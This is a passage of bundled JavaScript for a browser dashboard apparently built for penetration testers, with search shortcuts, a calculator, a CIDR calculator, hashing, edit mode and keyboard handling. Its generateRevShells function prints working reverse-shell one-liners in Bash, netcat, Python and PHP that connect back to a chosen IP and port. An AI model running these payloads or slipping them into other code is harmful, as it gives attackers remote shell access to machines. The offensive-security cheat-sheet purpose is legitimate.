    showOverlay("OFFSEC REVERSE SHELL GENERATOR", generateRevShells(ip || '10.10.14.2', port || '4444'));
    return;
  }
  if (prefix === 'port' && query) {
    const info = commonPorts[query] || "Unknown / Unassigned Port";
    showOverlay("PORT LOOKUP", `[Port ${query}] -> ${info}`);
    return;
  }
  if (prefix === 'ip') {
    showOverlay("NETWORK TELEMETRY", "Fetching public IP...");
    if (!navigator.onLine) {
      showOverlay("NETWORK TELEMETRY", "Offline — cannot fetch public IP.");
      return;
    }
    fetch('https://api.ipify.org?format=json', { cache: 'no-store' })
      .then(r => {
        if (!r.ok) throw new Error(`HTTP ${r.status}`);
        return r.json();
      })
      .then(d => showOverlay("NETWORK TELEMETRY", `Public IP: ${d.ip}\nTimezone:  ${Intl.DateTimeFormat().resolvedOptions().timeZone}`))
      .catch(() => showOverlay("NETWORK TELEMETRY", "Failed to fetch public IP."));
    return;
  }

  const calc = evaluateExpression(input);
  if (calc !== null) {
    showOverlay("CALCULATOR", `${input} = ${calc}`);
    return;
  }

  closeCheatOverlay();
  closeOmniSuggestions();

  const bangs = {
    g: 'https://www.google.com/search?q=',
    gh: 'https://github.com/search?q=',
    yt: 'https://www.youtube.com/results?search_query=',
    sh: 'https://www.shodan.io/search?query=',
    ai: 'https://chatgpt.com/?q=',
    cl: 'https://claude.ai/new?q=',
    px: 'https://www.perplexity.ai/search?q=',
    so: 'https://stackoverflow.com/search?q=',
    mdn: 'https://developer.mozilla.org/en-US/search?q=',
    cve: 'https://nvd.nist.gov/vuln/search/results?form_type=Basic&results_type=overview&search_type=all&query=',
    lc: 'https://leetcode.com/problemset/?search=',
    htb: 'https://www.google.com/search?q=site:hackthebox.com+',
    thm: 'https://tryhackme.com/hacktivities?tab=search&value='
  };

  let targetUrl;
  if (prefix === 'ds' && !query) {
    targetUrl = 'https://chat.deepseek.com/';
  } else if (bangs[prefix] && query) {
    targetUrl = bangs[prefix] + encodeURIComponent(query);
  } else {
    targetUrl = 'https://www.google.com/search?q=' + encodeURIComponent(input);
  }

  inputElem.value = '';
  window.location.href = targetUrl;
}

/**
 * Safely evaluate a numeric arithmetic expression without eval/Function.
 * Returns null when the input is not a pure arithmetic expression.
 */
function evaluateExpression(input) {
  const expr = input.replace(/\^/g, '**');
  if (!/^[\d\s+\-*/().%*]+$/.test(expr)) return null;
  if (!/[+\-*/%]/.test(expr)) return null;
  if (!/^[\d\s+\-*/().%*]+$/.test(expr.replace(/\*\*/g, '*'))) return null;

  const tokens = expr.match(/\d+(?:\.\d+)?|\.\d+|\*\*|[+\-*/()%]/g);
  if (!tokens || tokens.join('') !== expr.replace(/\s+/g, '')) return null;

  let pos = 0;
  const peek = () => tokens[pos];
  const next = () => tokens[pos++];

  function parseExpression() {
    let value = parseTerm();
    while (peek() === '+' || peek() === '-') {
      const op = next();
      const rhs = parseTerm();
      value = op === '+' ? value + rhs : value - rhs;
    }
    return value;
  }

  function parseTerm() {
    let value = parseUnary();
    while (peek() === '*' || peek() === '/' || peek() === '%' || peek() === '**') {
      const op = next();
      const rhs = parseUnary();
      if (op === '*') value *= rhs;
      else if (op === '/') value /= rhs;
      else if (op === '%') value %= rhs;
      else value = Math.pow(value, rhs);
    }
    return value;
  }

  function parseUnary() {
    if (peek() === '-') { next(); return -parseUnary(); }
    if (peek() === '+') { next(); return parseUnary(); }
    return parsePrimary();
  }

  function parsePrimary() {
    const tok = next();
    if (tok === undefined) throw new Error('unexpected end');
    if (tok === '(') {
      const value = parseExpression();
      if (next() !== ')') throw new Error('missing )');
      return value;
    }
    const n = Number(tok);
    if (!Number.isFinite(n)) throw new Error('bad number');
    return n;
  }

  try {
    const result = parseExpression();
    if (pos !== tokens.length) return null;
    if (!Number.isFinite(result)) return null;
    return Number.isInteger(result) ? String(result) : String(Math.round(result * 1e10) / 1e10);
  } catch (err) {
    return null;
  }
}


function calculateCidr(cidrStr) {
  const match = cidrStr.trim().match(/^(\d{1,3}(?:\.\d{1,3}){3})\/(\d{1,2})$/);
  if (!match) return "Usage: cidr <ip>/<mask> (e.g., cidr 192.168.1.0/24)";
  const ipParts = match[1].split('.').map(Number);
  const prefix = parseInt(match[2], 10);
  if (ipParts.some(p => p < 0 || p > 255) || prefix < 0 || prefix > 32) return "Invalid IP or CIDR prefix.";

  const ipInt = (((ipParts[0] << 24) | (ipParts[1] << 16) | (ipParts[2] << 8) | ipParts[3]) >>> 0);
  const mask = prefix === 0 ? 0 : (0xffffffff << (32 - prefix)) >>> 0;
  const net = (ipInt & mask) >>> 0;
  const bcast = (net | (~mask >>> 0)) >>> 0;
  const toIp = n => [(n >>> 24) & 255, (n >>> 16) & 255, (n >>> 8) & 255, n & 255].join('.');

  let firstIp;
  let lastIp;
  let hosts;
  if (prefix === 32) {
    firstIp = lastIp = toIp(net);
    hosts = 1;
  } else if (prefix === 31) {
    firstIp = toIp(net);
    lastIp = toIp(bcast);
    hosts = 2;
  } else {
    firstIp = toIp(net + 1);
    lastIp = toIp(bcast - 1);
    hosts = Math.pow(2, 32 - prefix) - 2;
  }

  return [
    `CIDR: ${cidrStr}`,
    `Netmask:   ${toIp(mask)}`,
    `Wildcard:  ${toIp(~mask >>> 0)}`,
    `Network:   ${toIp(net)}`,
    `Broadcast: ${toIp(bcast)}`,
    `First IP:  ${firstIp}`,
    `Last IP:   ${lastIp}`,
    `Usable Hosts: ${hosts.toLocaleString()}`,
  ].join('\n');
}

function generateRevShells(ip = "10.10.14.2", port = "4444") {
  const safeIp = /^[0-9a-fA-F:.]{1,45}$/.test(ip) ? ip : '10.10.14.2';
  const safePort = /^\d{1,5}$/.test(port) ? port : '4444';
  return `REVERSE SHELL PAYLOADS (${safeIp}:${safePort}):

[Bash -i]
bash -i >& /dev/tcp/${safeIp}/${safePort} 0>&1

[Bash 196]
0<&196;exec 196<>/dev/tcp/${safeIp}/${safePort}; sh <&196 >&196 2>&196

[Netcat mkfifo]
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ${safeIp} ${safePort} >/tmp/f

[Python3]
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${safeIp}",${safePort}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'

[PHP exec]
php -r '\\$sock=fsockopen("${safeIp}",${safePort});exec("sh <&3 >&3 2>&3");'`;
}

function toHex(buffer) {
  return Array.from(new Uint8Array(buffer)).map(x => x.toString(16).padStart(2, '0')).join('');
}

async function computeHashes(text) {
  if (!crypto || !crypto.subtle) {
    showOverlay("CRYPTO HASHES", "Web Crypto unavailable. Open this page over http(s) or localhost to use hash generation.");
    return;
  }
  const enc = new TextEncoder().encode(text);
  try {
    const [buf256, buf1] = await Promise.all([
      crypto.subtle.digest('SHA-256', enc),
      crypto.subtle.digest('SHA-1', enc),
    ]);
    showOverlay("CRYPTO HASHES", `Input:   ${text}\nSHA-256: ${toHex(buf256)}\nSHA-1:   ${toHex(buf1)}`);
  } catch (err) {
    showOverlay("CRYPTO HASHES", "Hashing failed in this browser context.");
  }
}
    exports["initSearch"] = initSearch;
    exports["closeOmniSuggestions"] = closeOmniSuggestions;
    exports["handleSearch"] = handleSearch;
  });

  __def("edit", function (module, exports, __req) {
    "use strict";
    var core = __req("core");
    var showToast = core.showToast;
    var hero = __req("hero");
    var saveHeroText = hero.saveHeroText;
    var dock = __req("dock");
    var renderDock = dock.renderDock;
    var bookmarks = __req("bookmarks");
    var renderBookmarks = bookmarks.renderBookmarks;
    var gmail = __req("gmail");
    var renderGmails = gmail.renderGmails;
    var tools = __req("tools");
    var renderQuickTools = tools.renderQuickTools;

/**
 * Edit Mode Module - Toggle edit mode for all editable elements
 */








let isEditMode = false;

const EDITABLE_IDS = ['greeting', 'subline-text', 'prompt-user', 'prompt-path', 'prompt-hash'];

function initEditMode() {
  window.isEditMode = false;
}

function renderAll() {
  renderBookmarks();
  renderDock();
  renderGmails();
  renderQuickTools();
}

function toggleEditMode() {
  isEditMode = !isEditMode;
  window.isEditMode = isEditMode;
  document.body.classList.toggle('edit-mode', isEditMode);

  const btn = document.getElementById('edit-mode-btn');

  if (isEditMode) {
    if (btn) {
      btn.classList.add('active');
      btn.innerHTML = '💾';
      btn.title = 'Save Changes (⌥E)';
    }
    EDITABLE_IDS.forEach(id => {
      const el = document.getElementById(id);
      if (el) el.setAttribute('contenteditable', 'true');
    });
    showToast('Edit Mode ON — Click any Site, Dock App, Email, Tool or Text to Edit!');
  } else {
    if (btn) {
      btn.classList.remove('active');
      btn.innerHTML = '✏️';
      btn.title = 'Enter Edit Mode (⌥E)';
    }
    EDITABLE_IDS.forEach(id => {
      const el = document.getElementById(id);
      if (el) el.removeAttribute('contenteditable');
    });
    saveHeroText();
    showToast('✔ All Customizations Saved');
  }

  renderAll();
}
    exports["initEditMode"] = initEditMode;
    exports["toggleEditMode"] = toggleEditMode;
  });

  __def("keyboard", function (module, exports, __req) {
    "use strict";
    var zen = __req("zen");
    var toggleZenMode = zen.toggleZenMode;
    var timer = __req("timer");
    var togglePomodoro = timer.togglePomodoro;
    var gmail = __req("gmail");
    var toggleGmailMenu = gmail.toggleGmailMenu;
    var closeGmailMenu = gmail.closeGmailMenu;
    var closeGmailModal = gmail.closeGmailModal;
    var scratchpad = __req("scratchpad");
    var toggleScratchpad = scratchpad.toggleScratchpad;
    var audio = __req("audio");
    var cycleAudio = audio.cycleAudio;
    var breathing = __req("breathing");
    var toggleBreathing = breathing.toggleBreathing;
    var theme = __req("theme");
    var cycleTheme = theme.cycleTheme;
    var toggleDarkMode = theme.toggleDarkMode;
    var edit = __req("edit");
    var toggleEditMode = edit.toggleEditMode;
    var shortcuts = __req("shortcuts");
    var toggleShortcutsModal = shortcuts.toggleShortcutsModal;
    var closeShortcutsModal = shortcuts.closeShortcutsModal;
    var overlay = __req("overlay");
    var closeCheatOverlay = overlay.closeCheatOverlay;
    var closeOmniSuggestions = overlay.closeOmniSuggestions;
    var bookmarks = __req("bookmarks");
    var closeSiteModal = bookmarks.closeSiteModal;
    var dock = __req("dock");
    var closeDockModal = dock.closeDockModal;
    var tools = __req("tools");
    var closeToolModal = tools.closeToolModal;

/**
 * Keyboard Module - Global keyboard shortcuts
 */















const MODAL_IDS = ['site-modal', 'dock-modal', 'gmail-modal', 'tool-modal', 'shortcuts-modal'];

function initKeyboard() {
  document.addEventListener('keydown', handleKeydown);
  document.addEventListener('click', handleClick);
}

function focusSearch(select = true) {
  const q = document.getElementById('q');
  if (!q) return;
  q.focus();
  if (select && typeof q.select === 'function') q.select();
}

function handleKeydown(e) {
  if ((e.metaKey || e.ctrlKey) && (e.code === 'KeyK' || e.key === 'k')) {
    e.preventDefault();
    focusSearch();
    return;
  }

  if (e.altKey && !e.metaKey && !e.ctrlKey) {
    const handlers = {
      KeyZ: toggleZenMode,
      KeyP: togglePomodoro,
      KeyM: () => toggleGmailMenu(e),
      KeyS: toggleScratchpad,
      KeyA: cycleAudio,
      KeyB: toggleBreathing,
      KeyT: cycleTheme,
      KeyD: toggleDarkMode,
      KeyE: toggleEditMode,
      KeyK: toggleShortcutsModal,
    };
    const handler = handlers[e.code];
    if (handler) {
      e.preventDefault();
      handler();
      return;
    }
  }

  if (e.key === 'Escape') {
    closeGmailMenu();
    closeCheatOverlay();
    closeOmniSuggestions();
    closeSiteModal();
    closeDockModal();
    closeGmailModal();
    closeToolModal();
    closeShortcutsModal();
    const sp = document.getElementById('scratchpad-wrap');
    if (sp) sp.classList.remove('show');
  }

  const active = document.activeElement;
  const tag = active ? active.tagName : '';
  const isTyping = tag === 'INPUT' || tag === 'TEXTAREA' || (active && active.isContentEditable);
  if (e.key === '/' && !isTyping) {
    e.preventDefault();
    focusSearch(false);
  }
}

function handleClick(e) {
  const target = e.target;
  if (!target || !(target instanceof Node)) return;

  const dockWrap = document.getElementById('dock-wrap');
  const gmailModal = document.getElementById('gmail-modal');
  const insideDock = dockWrap && dockWrap.contains(target);
  const insideGmailModal = gmailModal && gmailModal.contains(target);
  if (!insideDock && !insideGmailModal) closeGmailMenu();

  const searchArea = document.getElementById('search-area');
  if (!searchArea || !searchArea.contains(target)) {
    closeCheatOverlay();
    closeOmniSuggestions();
  }

  const closeModalById = {
    'site-modal': closeSiteModal,
    'dock-modal': closeDockModal,
    'gmail-modal': closeGmailModal,
    'tool-modal': closeToolModal,
    'shortcuts-modal': closeShortcutsModal,
  };
  const id = target.id;
  if (id && Object.prototype.hasOwnProperty.call(closeModalById, id)) {
    closeModalById[id]();
  }
}

    exports["initKeyboard"] = initKeyboard;
    exports["focusSearch"] = focusSearch;
  });

  __def("main", function (module, exports, __req) {
    "use strict";
    var storage = __req("storage");
    var store = storage.store;
    var restoreDefaultSites = storage.restoreDefaultSites;
    var dock = __req("dock");
    var initDock = dock.initDock;
    var openDockModal = dock.openDockModal;
    var closeDockModal = dock.closeDockModal;
    var saveDockSite = dock.saveDockSite;
    var bookmarks = __req("bookmarks");
    var initBookmarks = bookmarks.initBookmarks;
    var openSiteModal = bookmarks.openSiteModal;
    var closeSiteModal = bookmarks.closeSiteModal;
    var saveNewSite = bookmarks.saveNewSite;
    var gmail = __req("gmail");
    var initGmail = gmail.initGmail;
    var openGmailModal = gmail.openGmailModal;
    var closeGmailModal = gmail.closeGmailModal;
    var saveGmailAccount = gmail.saveGmailAccount;
    var closeGmailMenu = gmail.closeGmailMenu;
    var toggleGmailMenu = gmail.toggleGmailMenu;
    var tools = __req("tools");
    var initTools = tools.initTools;
    var openToolModal = tools.openToolModal;
    var closeToolModal = tools.closeToolModal;
    var saveCustomTool = tools.saveCustomTool;
    var runQuickCmd = tools.runQuickCmd;
    var fillQuickCmd = tools.fillQuickCmd;
    var editCurrentCheatSheet = tools.editCurrentCheatSheet;
    var setToolModalMode = tools.setToolModalMode;
    var widget = __req("widget");
    var initWidget = widget.initWidget;
    var initWidgetEvents = widget.initWidgetEvents;
    var switchWidgetTab = widget.switchWidgetTab;
    var clearDoneTodos = widget.clearDoneTodos;
    var addTodo = widget.addTodo;
    var addHabit = widget.addHabit;
    var addSnippet = widget.addSnippet;
    var search = __req("search");
    var initSearch = search.initSearch;
    var handleSearch = search.handleSearch;
    var timer = __req("timer");
    var initTimer = timer.initTimer;
    var startCustomPomodoro = timer.startCustomPomodoro;
    var togglePomodoro = timer.togglePomodoro;
    var resetStatus = timer.resetStatus;
    var audio = __req("audio");
    var initAudio = audio.initAudio;
    var cycleAudio = audio.cycleAudio;
    var scratchpad = __req("scratchpad");
    var initScratchpad = scratchpad.initScratchpad;
    var toggleScratchpad = scratchpad.toggleScratchpad;
    var downloadScratchpad = scratchpad.downloadScratchpad;
    var exportAllData = scratchpad.exportAllData;
    var triggerImportData = scratchpad.triggerImportData;
    var importAllData = scratchpad.importAllData;
    var renderPomoChart = scratchpad.renderPomoChart;
    var theme = __req("theme");
    var initTheme = theme.initTheme;
    var cycleTheme = theme.cycleTheme;
    var toggleDarkMode = theme.toggleDarkMode;
    var THEMES = theme.THEMES;
    var getThemeIndex = theme.getThemeIndex;
    var getActiveTheme = theme.getActiveTheme;
    var hero = __req("hero");
    var initHero = hero.initHero;
    var saveHeroText = hero.saveHeroText;
    var edit = __req("edit");
    var initEditMode = edit.initEditMode;
    var toggleEditMode = edit.toggleEditMode;
    var keyboard = __req("keyboard");
    var initKeyboard = keyboard.initKeyboard;
    var shortcuts = __req("shortcuts");
    var toggleShortcutsModal = shortcuts.toggleShortcutsModal;
    var closeShortcutsModal = shortcuts.closeShortcutsModal;
    var zen = __req("zen");
    var toggleZenMode = zen.toggleZenMode;
    var initZen = zen.initZen;
    var breathing = __req("breathing");
    var toggleBreathing = breathing.toggleBreathing;
    var focus = __req("focus");
    var setFocus = focus.setFocus;
    var clearFocus = focus.clearFocus;
    var renderFocus = focus.renderFocus;
    var core = __req("core");
    var showToast = core.showToast;
    var overlay = __req("overlay");
    var closeCheatOverlay = overlay.closeCheatOverlay;
    var closeOmniSuggestions = overlay.closeOmniSuggestions;
    var copyOverlayText = overlay.copyOverlayText;

/**
 * Main Entry Point - Initialize all modules
 */























/* ------------------------------------------------------------------
 * Global bridge for inline HTML event handlers (onclick="...").
 * Inline attributes resolve against `window`, so every handler used in
 * index.html must be published here.
 * ------------------------------------------------------------------ */
const GLOBAL_HANDLERS = {
  // Dock
  openDockModal, closeDockModal, saveDockSite,
  // Bookmarks
  openSiteModal, closeSiteModal, saveNewSite,
  // Gmail
  openGmailModal, closeGmailModal, saveGmailAccount, closeGmailMenu, toggleGmailMenu,
  // Tools / cheat-sheets
  openToolModal, closeToolModal, saveCustomTool, runQuickCmd, fillQuickCmd,
  editCurrentCheatSheet, setToolModalMode,
  // Search / overlay
  handleSearch, closeCheatOverlay, closeOmniSuggestions, copyOverlayText,
  // Widget (tasks / habits / snippets)
  switchWidgetTab, clearDoneTodos, addTodo, addHabit, addSnippet,
  // Timer
  startCustomPomodoro, togglePomodoro, resetStatus,
  // Audio / scratchpad / theme
  cycleAudio, toggleScratchpad, downloadScratchpad,
  exportAllData, triggerImportData, importAllData,
  cycleTheme,
  // Hero / edit / zen / breathing
  saveHeroText, toggleEditMode, toggleZenMode, toggleBreathing,
  // Shortcuts modal
  toggleShortcutsModal, closeShortcutsModal,
  // Focus
  setFocus, clearFocus, renderFocus,
  // Toasts + reset
  showToast, restoreDefaultSites,
  // Appearance
  cycleTheme, toggleDarkMode,
};

Object.entries(GLOBAL_HANDLERS).forEach(([name, fn]) => {
  window[name] = fn;
});

// Expose store for debugging / power users.
window.store = store;

function updateKeyboardHints() {
  document.querySelectorAll('kbd[data-k]').forEach(k => {
    k.textContent = '⌥' + k.dataset.k;
  });
}

function init() {
  initTheme();
  initHero();
  initEditMode();
  initDock();
  initBookmarks();
  initGmail();
  initTools();
  initWidget();
  initWidgetEvents();
  initSearch();
  initTimer();
  initAudio();
  initScratchpad();
  initKeyboard();
  initZen();

  renderFocus();
  renderPomoChart();
  updateKeyboardHints();

  // initTheme() already painted the correct label; re-assert it in case the
  // badge element was not present during that call.
  const themeNameEl = document.getElementById('theme-name');
  const activeTheme = getActiveTheme();
  if (themeNameEl && activeTheme) themeNameEl.textContent = activeTheme.name;
}

if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', init);
} else {
  init();
}
  });

  // Entry point: requiring main runs its DOMContentLoaded bootstrap.
  __req('main');

  global.WarMode = { modules: __modules, req: __req };
})(typeof window !== 'undefined' ? window : globalThis);
